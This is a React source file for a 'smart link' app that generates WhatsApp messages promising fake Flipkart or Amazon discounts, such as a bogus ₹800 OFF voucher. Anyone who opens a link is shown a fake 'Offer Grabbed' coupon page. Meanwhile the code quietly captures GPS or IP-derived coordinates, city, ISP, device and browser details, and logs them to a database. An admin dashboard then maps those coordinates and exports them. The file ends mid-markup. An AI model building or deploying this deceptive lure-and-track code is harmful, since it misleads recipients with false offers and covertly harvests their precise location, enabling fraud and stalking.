import React, { useState, useEffect } from 'react';
import { supabase } from './utils/supabase';
import MapView from './components/MapView';
import {
  Link as LinkIcon,
  MapPin,
  ExternalLink,
  Copy,
  Check,
  Trash2,
  Plus,
  RefreshCw,
  Globe,
  Download,
  AlertCircle,
  Tag,
  Gift,
  ShoppingBag,
  Sparkles,
  ArrowRight,
  MessageCircle,
  Share2,
  Shuffle
} from 'lucide-react';

const DEAL_TEMPLATES = [
  (item, discount, platform, url) =>
`🔥 *Limited Time Loot Deal!*
Book a *${item}* and grab flat *₹${discount} OFF* on ${platform}! 🎁

👉 Claim your voucher before it expires:
${url}

⚡ *Hurry, offer valid for today only!*`,

  (item, discount, platform, url) =>
`⚡ *Flash Sale Alert!*
Grab *${item}* & top electronics with an extra *₹${discount} Discount* on ${platform}! 🛍️

👉 Tap link to grab the deal:
${url}

🛒 *Coupon automatically applied at checkout!*`,

  (item, discount, platform, url) =>
`🎉 *Mega Savings Unlocked!*
Order a *${item}* or anything on your cart to get flat *₹${discount} OFF* on ${platform}! 🏷️

👉 Claim your instant voucher:
${url}

⏳ *Limited vouchers available!*`,

  (item, discount, platform, url) =>
`💥 *Super Price Drop!*
Huge discount on *${item}*! Get flat *₹${discount} OFF* on ${platform} right now!

👉 Click here to order:
${url}

✨ Don't miss this deal!`
];

const ITEM_CATEGORIES = [
  'Powerbank',
  'Electronics & Gadget',
  'Wireless Earbuds',
  'Smartwatch',
  'Fast Charger',
  'Bluetooth Speaker',
  'Smartphone'
];

export default function App() {
  const [links, setLinks] = useState([]);
  const [events, setEvents] = useState([]);
  const [loading, setLoading] = useState(true);
  const [copiedSlug, setCopiedSlug] = useState(null);
  const [copiedMsgId, setCopiedMsgId] = useState(null);
  const [selectedFilter, setSelectedFilter] = useState('all');

  // Form State
  const [campaignName, setCampaignName] = useState('');
  const [platform, setPlatform] = useState('flipkart');
  const [destinationUrl, setDestinationUrl] = useState('');
  const [offerDiscount, setOfferDiscount] = useState('800');
  const [itemCategory, setItemCategory] = useState('Powerbank');
  const [templateIndex, setTemplateIndex] = useState(0);
  const [customSlug, setCustomSlug] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [formError, setFormError] = useState('');

  // Visitor Redirect State
  const [visitorMode, setVisitorMode] = useState(false);
  const [visitorOffer, setVisitorOffer] = useState('800');
  const [visitorPlatform, setVisitorPlatform] = useState('Flipkart / Amazon');
  const [visitorDestination, setVisitorDestination] = useState(null);
  const [redirectCountdown, setRedirectCountdown] = useState(2);
  const [offerStatus, setOfferStatus] = useState('Activating your exclusive deal...');

  // Automatically detect domain
  const domainUrl = window.location.origin;

  // Detect Device and Browser
  const getDeviceInfo = () => {
    const ua = navigator.userAgent;
    let device_type = 'Desktop';
    if (/tablet|ipad/i.test(ua)) device_type = 'Tablet';
    else if (/mobile|iphone|android/i.test(ua)) device_type = 'Mobile';

    let browser = 'Unknown';
    if (/chrome|crios/i.test(ua)) browser = 'Chrome';
    else if (/firefox|fxios/i.test(ua)) browser = 'Firefox';
    else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
    else if (/edg/i.test(ua)) browser = 'Edge';

    let os = 'Unknown OS';
    if (/windows/i.test(ua)) os = 'Windows';
    else if (/macintosh|mac os x/i.test(ua)) os = 'macOS';
    else if (/linux/i.test(ua)) os = 'Linux';
    else if (/android/i.test(ua)) os = 'Android';
    else if (/iphone|ipad|ipod/i.test(ua)) os = 'iOS';

    return { device_type, browser, operating_system: os, user_agent: ua };
  };

  // 1. Check if visitor opened a tracking link
  useEffect(() => {
    const searchParams = new URLSearchParams(window.location.search);
    const querySlug = searchParams.get('s');
    const pathSlug = window.location.pathname.replace(/^\/+/, '').split('/')[0];
    const targetSlug = querySlug || (pathSlug && pathSlug !== 'index.html' ? pathSlug : null);

    if (targetSlug) {
      setVisitorMode(true);
      handleVisitorFlow(targetSlug);
    } else {
      fetchAdminData();
      const interval = setInterval(fetchAdminDataSilently, 5000);
      return () => clearInterval(interval);
    }
  }, []);

  // Visitor Tracking & Redirection Engine with Offer Applied
  const handleVisitorFlow = async (slug) => {
    try {
      // 1. Resolve destination & offer from Supabase
      const { data: link, error } = await supabase
        .from('short_links')
        .select('*')
        .eq('slug', slug)
        .single();

      if (error || !link) {
        setOfferStatus('Link not found or has expired.');
        return;
      }

      const discountValue = link.description || '800';
      const cleanDiscount = discountValue.replace(/[^0-9]/g, '') || '800';
      const offerCode = `${cleanDiscount}off`;

      setVisitorOffer(cleanDiscount);
      setVisitorPlatform(link.platform === 'amazon' ? 'Amazon' : link.platform === 'flipkart' ? 'Flipkart' : 'Store');

      // 2. Append ?iotkitoffer=800off to destination URL
      let finalTargetUrl = link.destination_url;
      try {
        const urlObj = new URL(link.destination_url);
        urlObj.searchParams.set('iotkitoffer', offerCode);
        finalTargetUrl = urlObj.toString();
      } catch {
        const sep = finalTargetUrl.includes('?') ? '&' : '?';
        finalTargetUrl = `${finalTargetUrl}${sep}iotkitoffer=${offerCode}`;
      }

      setVisitorDestination(finalTargetUrl);

      // 3. Silently capture Latitude & Longitude in background
      captureLocationInBackground(link, slug);

      // 4. Start 2-second countdown and redirect
      setOfferStatus(`Offer Grabbed! Book something to get ₹${cleanDiscount} OFF on ${link.platform === 'flipkart' ? 'Flipkart' : 'Amazon'}. Redirecting...`);

      let timeLeft = 2;
      const timer = setInterval(() => {
        timeLeft -= 1;
        setRedirectCountdown(timeLeft);
        if (timeLeft <= 0) {
          clearInterval(timer);
          window.location.replace(finalTargetUrl);
        }
      }, 1000);

    } catch (err) {
      console.error('Visitor flow error:', err);
      if (visitorDestination) {
        window.location.replace(visitorDestination);
      }
    }
  };

  // Background Location Capture (GPS or IP)
  const captureLocationInBackground = async (link, slug) => {
    try {
      const locationData = await captureLocation();
      const deviceInfo = getDeviceInfo();

      if (locationData && locationData.latitude && locationData.longitude) {
        await supabase.from('visitor_events').insert({
          link_id: link.id,
          slug: slug,
          latitude: locationData.latitude,
          longitude: locationData.longitude,
          gps_latitude: locationData.gps_latitude || null,
          gps_longitude: locationData.gps_longitude || null,
          gps_accuracy: locationData.accuracy || null,
          gps_consent: locationData.gps_consent || false,
          city: locationData.city || null,
          state: locationData.region || null,
          country: locationData.country || null,
          country_code: locationData.country_code || null,
          postal_code: locationData.postal || null,
          timezone: locationData.timezone || null,
          isp: locationData.org || null,
          device_type: deviceInfo.device_type,
          browser: deviceInfo.browser,
          operating_system: deviceInfo.operating_system,
          user_agent: deviceInfo.user_agent,
          referrer: document.referrer || null,
          visited_at: new Date().toISOString()
        });
      }
    } catch (e) {
      console.warn('Background tracking logged:', e);
    }
  };

  // Capture Lat and Long (GPS or IP)
  const captureLocation = () => {
    return new Promise((resolve) => {
      let resolved = false;

      const safetyTimeout = setTimeout(async () => {
        if (!resolved) {
          resolved = true;
          const ipLoc = await getIpLocation();
          resolve(ipLoc);
        }
      }, 5000);

      if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            if (!resolved) {
              resolved = true;
              clearTimeout(safetyTimeout);
              let city = null;
              let country = null;
              try {
                const ipInfo = await getIpLocation();
                city = ipInfo?.city || null;
                country = ipInfo?.country || null;
              } catch {
                // Ignore
              }

              resolve({
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                gps_latitude: pos.coords.latitude,
                gps_longitude: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                gps_consent: true,
                source: 'gps',
                city,
                country
              });
            }
          },
          async () => {
            if (!resolved) {
              resolved = true;
              clearTimeout(safetyTimeout);
              const ipLoc = await getIpLocation();
              resolve(ipLoc);
            }
          },
          {
            enableHighAccuracy: true,
            timeout: 4500,
            maximumAge: 60000
          }
        );
      } else {
        getIpLocation().then((loc) => {
          if (!resolved) {
            resolved = true;
            clearTimeout(safetyTimeout);
            resolve(loc);
          }
        });
      }
    });
  };

  // Fallback IP Geolocation to obtain approximate Lat/Long
  const getIpLocation = async () => {
    try {
      const res = await fetch('https://ipapi.co/json/');
      if (res.ok) {
        const data = await res.json();
        if (data.latitude && data.longitude) {
          return {
            latitude: parseFloat(data.latitude),
            longitude: parseFloat(data.longitude),
            city: data.city,
            region: data.region,
            country: data.country_name,
            country_code: data.country_code,
            postal: data.postal,
            timezone: data.timezone,
            org: data.org,
            gps_consent: false,
            source: 'ip'
          };
        }
      }
    } catch {
      try {
        const res2 = await fetch('https://freeipapi.com/api/json');
        if (res2.ok) {
          const data2 = await res2.json();
          if (data2.latitude && data2.longitude) {
            return {
              latitude: parseFloat(data2.latitude),
              longitude: parseFloat(data2.longitude),
              city: data2.cityName,
              region: data2.regionName,
              country: data2.countryName,
              country_code: data2.countryCode,
              postal: data2.zipCode,
              timezone: data2.timeZone,
              gps_consent: false,
              source: 'ip'
            };
          }
        }
      } catch (e) {
        console.warn('IP location fetch failed', e);
      }
    }
    return null;
  };

  // Fetch Admin Data
  const fetchAdminData = async () => {
    setLoading(true);
    await fetchAdminDataSilently();
    setLoading(false);
  };

  const fetchAdminDataSilently = async () => {
    try {
      const [linksRes, eventsRes] = await Promise.all([
        supabase.from('short_links').select('*').order('created_at', { ascending: false }),
        supabase.from('visitor_events').select('*').order('visited_at', { ascending: false }).limit(300)
      ]);

      if (linksRes.data) setLinks(linksRes.data);
      if (eventsRes.data) setEvents(eventsRes.data);
    } catch (err) {
      console.error('Error fetching data:', err);
    }
  };

  // Generate random 12-char slug
  const generateRandomSlug = () => {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 12; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  };

  // Create Short Link with Offer Discount
  const handleCreateLink = async (e) => {
    e.preventDefault();
    setFormError('');

    if (!campaignName.trim() || !destinationUrl.trim()) {
      setFormError('Please enter a campaign name and destination URL.');
      return;
    }

    try {
      new URL(destinationUrl);
    } catch {
      setFormError('Please enter a valid destination URL including https://');
      return;
    }

    setSubmitting(true);
    const slug = (customSlug.trim() || generateRandomSlug()).toLowerCase();
    const cleanDiscount = offerDiscount.trim().replace(/[^0-9]/g, '') || '800';

    try {
      const { data, error } = await supabase.from('short_links').insert({
        name: campaignName.trim(),
        slug: slug,
        destination_url: destinationUrl.trim(),
        platform: platform,
        description: cleanDiscount,
        status: 'active',
        created_at: new Date().toISOString()
      }).select().single();

      if (error) {
        if (error.code === '23505') {
          setFormError('Slug already exists! Please choose another slug.');
        } else {
          setFormError(error.message || 'Error creating link');
        }
      } else {
        setLinks([data, ...links]);
        setCampaignName('');
        setDestinationUrl('');
        setCustomSlug('');
      }
    } catch (err) {
      setFormError(err.message || 'Failed to create link');
    } finally {
      setSubmitting(false);
    }
  };

  // Delete Link
  const handleDeleteLink = async (id, slug) => {
    if (!window.confirm(`Delete link for "${slug}"?`)) return;
    try {
      await supabase.from('short_links').delete().eq('id', id);
      setLinks(links.filter(l => l.id !== id));
      setEvents(events.filter(e => e.slug !== slug));
    } catch (err) {
      console.error('Delete failed:', err);
    }
  };

  // Copy Link
  const handleCopy = (slug) => {
    const fullUrl = `${domainUrl}/?s=${slug}`;
    navigator.clipboard.writeText(fullUrl);
    setCopiedSlug(slug);
    setTimeout(() => setCopiedSlug(null), 2000);
  };

  // Generate WhatsApp text for a link
  const buildWhatsAppMessage = (slug, discount, plat, category = 'Powerbank', tIndex = templateIndex) => {
    const fullUrl = `${domainUrl}/?s=${slug}`;
    const platName = plat === 'flipkart' ? 'Flipkart' : plat === 'amazon' ? 'Amazon' : 'Store';
    const cleanDisc = (discount || '800').replace(/[^0-9]/g, '') || '800';
    const templateFn = DEAL_TEMPLATES[tIndex % DEAL_TEMPLATES.length];
    return templateFn(category, cleanDisc, platName, fullUrl);
  };

  // Copy WhatsApp Message to Clipboard
  const handleCopyWhatsAppMessage = (id, msg) => {
    navigator.clipboard.writeText(msg);
    setCopiedMsgId(id);
    setTimeout(() => setCopiedMsgId(null), 2500);
  };

  // Open WhatsApp directly
  const handleOpenWhatsApp = (msg) => {
    const encoded = encodeURIComponent(msg);
    window.open(`https://api.whatsapp.com/send?text=${encoded}`, '_blank');
  };

  // Export JSON
  const handleExportJSON = () => {
    const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(events, null, 2));
    const downloadAnchor = document.createElement('a');
    downloadAnchor.setAttribute("href", dataStr);
    downloadAnchor.setAttribute("download", `visitor_lat_long_${new Date().toISOString().slice(0, 10)}.json`);
    document.body.appendChild(downloadAnchor);
    downloadAnchor.click();
    downloadAnchor.remove();
  };

  // Filter & Enrich events with Campaign Details
  const filteredRawEvents = selectedFilter === 'all'
    ? events
    : events.filter(e => e.slug === selectedFilter);

  const enrichedEvents = filteredRawEvents.map((ev) => {
    const matchedLink = links.find(l => (ev.link_id && l.id === ev.link_id) || l.slug === ev.slug);
    return {
      ...ev,
      campaign_name: matchedLink?.name || 'Direct Link',
      platform: matchedLink?.platform || null,
      discount: matchedLink?.description || null
    };
  });

  // Form preview message
  const previewSlug = customSlug.trim() || 'deal-preview';
  const previewMessage = buildWhatsAppMessage(
    previewSlug,
    offerDiscount,
    platform,
    itemCategory,
    templateIndex
  );

  // ==========================================
  // RENDER: VISITOR OFFER SCREEN (No tech details shown)
  // ==========================================
  if (visitorMode) {
    return (
      <div style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '1.5rem',
        background: 'radial-gradient(circle at 50% 20%, #1e1b4b 0%, #0b0f19 80%)'
      }}>
        <div className="card" style={{
          maxWidth: '460px',
          width: '100%',
          textAlign: 'center',
          border: '1px solid #3b82f644',
          boxShadow: '0 20px 50px rgba(0, 0, 0, 0.6)',
          background: '#0f172a'
        }}>
          {/* Badge */}
          <div style={{
            display: 'inline-flex',
            alignItems: 'center',
            gap: '0.4rem',
            padding: '0.4rem 1rem',
            background: 'linear-gradient(135deg, #f59e0b, #ef4444)',
            borderRadius: '9999px',
            fontSize: '0.85rem',
            fontWeight: 700,
            color: '#ffffff',
            textTransform: 'uppercase',
            letterSpacing: '0.05em',
            marginBottom: '1.25rem'
          }}>
            <Sparkles size={16} /> Exclusive Deal Unlocked
          </div>

          <h2 style={{ fontSize: '1.75rem', fontWeight: 800, color: '#f8fafc', marginBottom: '0.5rem' }}>
            🎉 Offer Grabbed!
          </h2>

          <p style={{ color: '#94a3b8', fontSize: '1rem', marginBottom: '1.5rem', lineHeight: '1.5' }}>
            Book or order something to get <strong style={{ color: '#38bdf8', fontSize: '1.15rem' }}>₹{visitorOffer} OFF</strong> on {visitorPlatform}.
          </p>

          {/* Coupon Display Card */}
          <div style={{
            background: 'linear-gradient(135deg, #1e293b, #0f172a)',
            border: '2px dashed #3b82f6',
            borderRadius: '12px',
            padding: '1.25rem',
            marginBottom: '1.5rem',
            position: 'relative'
          }}>
            <div style={{ fontSize: '0.8rem', color: '#94a3b8', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: '0.25rem' }}>
              Instant Voucher Applied
            </div>
            <div style={{ fontSize: '1.5rem', fontWeight: 800, color: '#34d399', letterSpacing: '0.05em' }}>
              IOTKIT{visitorOffer}OFF
            </div>
            <div style={{ fontSize: '0.8rem', color: '#60a5fa', marginTop: '0.35rem' }}>
              ✓ Automatically linked to your cart & checkout
            </div>
          </div>

          {/* Action Button & Countdown */}
          {visitorDestination && (
            <div>
              <a
                href={visitorDestination}
                className="btn-primary"
                style={{
                  width: '100%',
                  justifyContent: 'center',
                  textDecoration: 'none',
                  padding: '0.85rem 1.25rem',
                  fontSize: '1.05rem',
                  background: 'linear-gradient(135deg, #2563eb, #1d4ed8)',
                  boxShadow: '0 4px 14px rgba(37, 99, 235, 0.4)'
                }}
              >
                Claim Offer & Go to Store ({redirectCountdown}s) <ArrowRight size={18} />
              </a>
              <p style={{ color: '#64748b', fontSize: '0.75rem', marginTop: '0.75rem' }}>
                Redirecting you automatically. Click above if not redirected.
              </p>
            </div>
          )}
        </div>
      </div>
    );
  }

  // ==========================================
  // RENDER: Admin Dashboard
  // ==========================================
  const gpsCount = events.filter(e => e.gps_consent).length;
  const ipCount = events.filter(e => !e.gps_consent).length;

  return (
    <div className="container" style={{ paddingTop: '2rem', paddingBottom: '3rem' }}>
      {/* Top Header */}
      <header style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '1rem', marginBottom: '2rem' }}>
        <div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
            <div style={{ background: '#2563eb', padding: '0.5rem', borderRadius: '10px' }}>
              <LinkIcon size={24} color="#ffffff" />
            </div>
            <h1 style={{ fontSize: '1.75rem', fontWeight: 700 }}>Smart Link Generator & WhatsApp Deal Sharer</h1>
          </div>
          <p style={{ color: '#94a3b8', marginTop: '0.25rem' }}>
            Generate short links with instant WhatsApp deal messages (Powerbank, Electronics & ₹800 OFF) and track visitor coordinates.
          </p>
        </div>

        <div style={{ display: 'flex', gap: '0.75rem' }}>
          <button onClick={fetchAdminData} className="btn-secondary" title="Refresh Data">
            <RefreshCw size={16} /> Refresh
          </button>
          <button onClick={handleExportJSON} className="btn-secondary" title="Export Captured Lat & Long as JSON">
            <Download size={16} /> Export JSON
          </button>
        </div>
      </header>

      {/* KPI Stats Grid */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '1rem', marginBottom: '2rem' }}>
        <div className="card">
          <div style={{ color: '#94a3b8', fontSize: '0.85rem', marginBottom: '0.25rem' }}>Total Active Links</div>
          <div style={{ fontSize: '1.8rem', fontWeight: 700, color: '#60a5fa' }}>{links.length}</div>
        </div>
        <div className="card">
          <div style={{ color: '#94a3b8', fontSize: '0.85rem', marginBottom: '0.25rem' }}>Total Coordinates Recorded</div>
          <div style={{ fontSize: '1.8rem', fontWeight: 700, color: '#34d399' }}>{events.length}</div>
        </div>
        <div className="card">
          <div style={{ color: '#94a3b8', fontSize: '0.85rem', marginBottom: '0.25rem' }}>Consented GPS Locations</div>
          <div style={{ fontSize: '1.8rem', fontWeight: 700, color: '#10b981' }}>{gpsCount}</div>
        </div>
        <div className="card">
          <div style={{ color: '#94a3b8', fontSize: '0.85rem', marginBottom: '0.25rem' }}>IP-Derived Locations</div>
          <div style={{ fontSize: '1.8rem', fontWeight: 700, color: '#38bdf8' }}>{ipCount}</div>
        </div>
      </div>

      {/* Main Grid: Generator Form + WhatsApp Preview + Map */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(360px, 1fr))', gap: '1.5rem', marginBottom: '2.5rem' }}>
        {/* Link Generator Form */}
        <div className="card">
          <h2 style={{ fontSize: '1.2rem', fontWeight: 600, marginBottom: '1.25rem', display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
            <Plus size={18} color="#3b82f6" /> Generate Smart Deal Link
          </h2>

          {formError && (
            <div style={{ background: '#7f1d1d44', border: '1px solid #ef4444', color: '#fca5a5', padding: '0.75rem', borderRadius: '8px', marginBottom: '1rem', display: 'flex', alignItems: 'center', gap: '0.5rem', fontSize: '0.9rem' }}>
              <AlertCircle size={16} /> {formError}
            </div>
          )}

          <form onSubmit={handleCreateLink} style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
            <div>
              <label style={{ display: 'block', fontSize: '0.85rem', color: '#94a3b8', marginBottom: '0.35rem' }}>Campaign Name</label>
              <input
                type="text"
                placeholder="e.g. Flipkart Powerbank ₹800 OFF"
                value={campaignName}
                onChange={(e) => setCampaignName(e.target.value)}
                required
              />
            </div>

            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem' }}>
              <div>
                <label style={{ display: 'block', fontSize: '0.85rem', color: '#94a3b8', marginBottom: '0.35rem' }}>Platform</label>
                <select value={platform} onChange={(e) => setPlatform(e.target.value)}>
                  <option value="flipkart">Flipkart</option>
                  <option value="amazon">Amazon</option>
                  <option value="custom">Custom Store</option>
                </select>
              </div>

              <div>
                <label style={{ display: 'block', fontSize: '0.85rem', color: '#94a3b8', marginBottom: '0.35rem' }}>Deal Item / Hook</label>
                <select value={itemCategory} onChange={(e) => setItemCategory(e.target.value)}>
                  {ITEM_CATEGORIES.map(cat => (
                    <option key={cat} value={cat}>{cat}</option>
                  ))}
                </select>
              </div>
            </div>

            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem' }}>
              <div>
                <label style={{ display: 'block', fontSize: '0.85rem', color: '#94a3b8', marginBottom: '0.35rem' }}>
                  Offer Discount (₹ OFF)
                </label>
                <input
                  type="number"
                  min="50"
                  step="50"
                  placeholder="800"
                  value={offerDiscount}
                  onChange={(e) => setOfferDiscount(e.target.value)}
                  required
                />
              </div>

              <div>
                <label style={{ display: 'block', fontSize: '0.85rem', color: '#94a3b8', marginBottom: '0.35rem' }}>Custom Slug (Optional)</label>
                <input
                  type="text"
                  placeholder="e.g. powerbank-deal"
                  value={customSlug}
                  onChange={(e) => setCustomSlug(e.target.value)}
                />
              </div>
            </div>

            <div>
              <label style={{ display: 'block', fontSize: '0.85rem', color: '#94a3b8', marginBottom: '0.35rem' }}>Destination URL</label>
              <input
                type="url"
                placeholder="https://www.flipkart.com/item/..."
                value={destinationUrl}
                onChange={(e) => setDestinationUrl(e.target.value)}
                required
              />
            </div>

            <button type="submit" disabled={submitting} className="btn-primary" style={{ marginTop: '0.25rem', justifyContent: 'center' }}>
              {submitting ? 'Generating...' : `Create Link with ₹${offerDiscount || '800'} OFF`}
            </button>
          </form>

          {/* Ready-to-Share WhatsApp Message Preview Box */}
          <div style={{
            marginTop: '1.25rem',
            padding: '1rem',
            background: '#0a1628',
            borderRadius: '10px',
            border: '1px solid #1e3a5f'
          }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.5rem' }}>
              <span style={{ fontSize: '0.85rem', fontWeight: 600, color: '#38bdf8', display: 'flex', alignItems: 'center', gap: '0.4rem' }}>
                <MessageCircle size={15} color="#25D366" /> WhatsApp Message Preview
              </span>
              <button
                type="button"
                onClick={() => setTemplateIndex((prev) => prev + 1)}
                className="btn-secondary"
                style={{ padding: '0.2rem 0.5rem', fontSize: '0.75rem' }}
                title="Shuffle deal message template"
              >
                <Shuffle size={12} /> Shuffle
              </button>
            </div>

            <div style={{
              background: '#07101e',
              border: '1px solid #162a45',
              borderRadius: '8px',
              padding: '0.75rem',
              fontSize: '0.85rem',
              color: '#e2e8f0',
              whiteSpace: 'pre-line',
              fontFamily: 'system-ui, sans-serif',
              lineHeight: '1.4',
              marginBottom: '0.75rem'
            }}>
              {previewMessage}
            </div>

            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.5rem' }}>
              <button
                type="button"
                onClick={() => handleCopyWhatsAppMessage('preview', previewMessage)}
                className="btn-secondary"
                style={{ justifyContent: 'center', fontSize: '0.8rem', padding: '0.45rem' }}
              >
                {copiedMsgId === 'preview' ? (
                  <span style={{ color: '#34d399', display: 'flex', alignItems: 'center', gap: '0.3rem' }}>
                    <Check size={14} /> Copied Message!
                  </span>
                ) : (
                  <span style={{ display: 'flex', alignItems: 'center', gap: '0.3rem' }}>
                    <Copy size={14} /> Copy Message
                  </span>
                )}
              </button>

              <button
                type="button"
                onClick={() => handleOpenWhatsApp(previewMessage)}
                style={{
                  background: '#25D366',
                  color: '#ffffff',
                  border: 'none',
                  borderRadius: '8px',
                  fontWeight: 600,
                  fontSize: '0.8rem',
                  padding: '0.45rem',
                  cursor: 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '0.3rem'
                }}
              >
                <MessageCircle size={15} /> Send WhatsApp
              </button>
            </div>
          </div>
        </div>

        {/* Live Visitor Map */}
        <div className="card" style={{ display: 'flex', flexDirection: 'column' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem', flexWrap: 'wrap', gap: '0.5rem' }}>
            <h2 style={{ fontSize: '1.2rem', fontWeight: 600, display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
              <Globe size={18} color="#10b981" /> Live Visitor Coordinates
            </h2>
            <div style={{ display: 'flex', gap: '0.75rem', fontSize: '0.8rem' }}>
              <span style={{ display: 'flex', alignItems: 'center', gap: '0.3rem', color: '#34d399' }}>
                <span style={{ width: 8, height: 8, background: '#10b981', borderRadius: '50%' }} /> GPS
              </span>
              <span style={{ display: 'flex', alignItems: 'center', gap: '0.3rem', color: '#60a5fa' }}>
                <span style={{ width: 8, height: 8, background: '#3b82f6', borderRadius: '50%' }} /> IP
              </span>
            </div>
          </div>

          <div style={{ flex: 1, minHeight: '350px' }}>
            <MapView locations={enrichedEvents} />
          </div>
        </div>
      </div>

      {/* Generated Short Links Table */}
      <div className="card" style={{ marginBottom: '2.5rem' }}>
        <h2 style={{ fontSize: '1.2rem', fontWeight: 600, marginBottom: '1rem' }}>Generated Campaigns & Links</h2>

        {links.length === 0 ? (
          <div style={{ textAlign: 'center', padding: '2rem', color: '#64748b' }}>
            No short links generated yet. Use the form above to generate your first tracking link.
          </div>
        ) : (
          <div style={{ overflowX: 'auto' }}>
            <table>
              <thead>
                <tr>
                  <th>Campaign Name</th>
                  <th>Platform</th>
                  <th>Offer</th>
                  <th>Share Link</th>
                  <th>WhatsApp Deal Message</th>
                  <th>Visits</th>
                  <th>Destination</th>
                  <th>Actions</th>
                </tr>
              </thead>
              <tbody>
                {links.map((link) => {
                  const shortUrl = `${domainUrl}/?s=${link.slug}`;
                  const isCopied = copiedSlug === link.slug;
                  const isMsgCopied = copiedMsgId === link.id;
                  const linkVisits = events.filter(e => e.slug === link.slug).length;
                  const discount = link.description || '800';
                  const waMessage = buildWhatsAppMessage(link.slug, discount, link.platform || 'flipkart', 'Powerbank & Electronics', 0);

                  return (
                    <tr key={link.id}>
                      <td style={{ fontWeight: 600, color: '#f8fafc' }}>{link.name}</td>
                      <td>
                        <span style={{
                          textTransform: 'capitalize',
                          background: '#1e293b',
                          padding: '0.2rem 0.6rem',
                          borderRadius: '6px',
                          fontSize: '0.8rem'
                        }}>
                          {link.platform || 'custom'}
                        </span>
                      </td>
                      <td>
                        <span style={{
                          display: 'inline-flex',
                          alignItems: 'center',
                          gap: '0.25rem',
                          background: '#064e3b',
                          color: '#34d399',
                          fontWeight: 700,
                          padding: '0.2rem 0.6rem',
                          borderRadius: '6px',
                          fontSize: '0.8rem'
                        }}>
                          <Tag size={12} /> ₹{discount} OFF
                        </span>
                      </td>
                      <td>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                          <span style={{ color: '#60a5fa', fontFamily: 'monospace' }}>{link.slug}</span>
                          <button
                            onClick={() => handleCopy(link.slug)}
                            className="btn-secondary"
                            style={{ padding: '0.25rem 0.5rem', fontSize: '0.75rem' }}
                            title="Copy short link only"
                          >
                            {isCopied ? <Check size={14} color="#34d399" /> : <Copy size={14} />}
                          </button>
                        </div>
                      </td>
                      <td>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '0.4rem' }}>
                          <button
                            onClick={() => handleCopyWhatsAppMessage(link.id, waMessage)}
                            className="btn-secondary"
                            style={{
                              padding: '0.35rem 0.65rem',
                              fontSize: '0.75rem',
                              borderColor: '#10b98188'
                            }}
                            title="Copy full ready-to-share message for WhatsApp"
                          >
                            {isMsgCopied ? (
                              <span style={{ color: '#34d399', display: 'flex', alignItems: 'center', gap: '0.25rem' }}>
                                <Check size={13} /> Copied!
                              </span>
                            ) : (
                              <span style={{ display: 'flex', alignItems: 'center', gap: '0.25rem', color: '#6ee7b7' }}>
                                <Copy size={13} /> Copy WhatsApp Text
                              </span>
                            )}
                          </button>

                          <button
                            onClick={() => handleOpenWhatsApp(waMessage)}
                            style={{
                              background: '#25D36622',
                              border: '1px solid #25D366',
                              color: '#25D366',
                              borderRadius: '6px',
                              padding: '0.35rem 0.5rem',
                              cursor: 'pointer',
                              display: 'flex',
                              alignItems: 'center'
                            }}
                            title="Share on WhatsApp directly"
                          >
                            <MessageCircle size={14} />
                          </button>
                        </div>
                      </td>
                      <td>
                        <span style={{
                          padding: '0.2rem 0.6rem',
                          background: '#1e293b',
                          borderRadius: '6px',
                          fontWeight: 600,
                          color: '#34d399'
                        }}>
                          {linkVisits}
                        </span>
                      </td>
                      <td>
                        <a
                          href={link.destination_url}
                          target="_blank"
                          rel="noreferrer"
                          style={{ display: 'inline-flex', alignItems: 'center', gap: '0.3rem', color: '#94a3b8', fontSize: '0.85rem' }}
                        >
                          Visit <ExternalLink size={12} />
                        </a>
                      </td>
                      <td>
                        <button
                          onClick={() => handleDeleteLink(link.id, link.slug)}
                          className="btn-danger"
                          title="Delete link"
                        >
                          <Trash2 size={14} />
                        </button>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* Visitor Recorded Coordinates Table with Campaign Name Display */}
      <div className="card">
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem', flexWrap: 'wrap', gap: '1rem' }}>
          <div>
            <h2 style={{ fontSize: '1.2rem', fontWeight: 600 }}>Visitor Coordinates Log</h2>
            <p style={{ color: '#94a3b8', fontSize: '0.85rem' }}>Latitude and Longitude captured from visitors with corresponding Campaign Name.</p>
          </div>

          {/* Filter by Campaign */}
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
            <span style={{ fontSize: '0.85rem', color: '#94a3b8' }}>Filter:</span>
            <select
              style={{ width: 'auto', padding: '0.4rem 0.8rem', fontSize: '0.85rem' }}
              value={selectedFilter}
              onChange={(e) => setSelectedFilter(e.target.value)}
            >
              <option value="all">All Campaigns ({events.length})</option>
              {links.map(l => (
